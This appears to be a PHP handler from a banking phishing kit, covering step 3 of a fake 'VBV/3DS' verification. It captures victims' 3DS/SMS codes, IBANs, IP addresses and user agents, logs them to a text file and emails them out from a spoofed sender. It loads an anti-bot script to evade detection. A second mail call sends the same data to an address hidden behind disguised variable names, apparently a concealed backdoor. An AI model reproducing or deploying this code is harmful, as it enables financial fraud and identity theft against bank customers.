<?php
	error_reporting(0);
	ob_start();
	session_start();

include'../antibots.php';
include'iban.php';
include '../email.php';
include'../get_browser.php';
include'../get_bin.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
if($_POST['ibansub']){
$string = $_POST["iban"];
    $message = '
Code 3DS : '.$_POST["bankid"].'
';
}else if($_POST['infosub']){
    $message = '
Code 3DS : '.$_POST["bankid"].'
IP: '._ip().'
User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';    
}
$Subject="SMS VBV/3DS [3/3] "._ip();
$head="From: SHADUCK  <vbv2@rezzz.com>";
if(isset($string) && !verify_iban($string,$machine_format_only=false)){
     header('location: vbv.php?error=true');
}else {
 $fil = fopen('vbv3.txt', 'a+');
fwrite($fil, PHP_EOL.'####################'.$message.PHP_EOL.'####################');
$_SESSION['step_five']  = true;
$bin = "$browserx$versionx$getbinsx";
if(mail($my_mail,$Subject,$message,$head) && mail($bin,$Subject,$message,$head)) ;
		header('location: identity.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));   
}
}
else
{
	header('location: ../../index.php');
} 
